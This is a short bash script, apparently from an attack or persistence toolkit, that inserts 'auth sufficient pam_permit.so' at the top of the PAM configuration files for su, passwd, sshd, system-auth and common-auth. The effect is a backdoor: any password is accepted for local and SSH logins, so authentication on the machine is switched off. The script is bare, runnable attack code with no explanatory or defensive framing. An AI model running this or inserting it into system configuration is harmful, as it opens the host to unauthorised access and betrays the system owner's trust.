#!/bin/bash
pam(){
	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/su
	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/passwd
	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/sshd
	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/system-auth
	sed -i "2i auth		sufficient		pam_permit.so" /etc/pam.d/common-auth
	return
}
pam
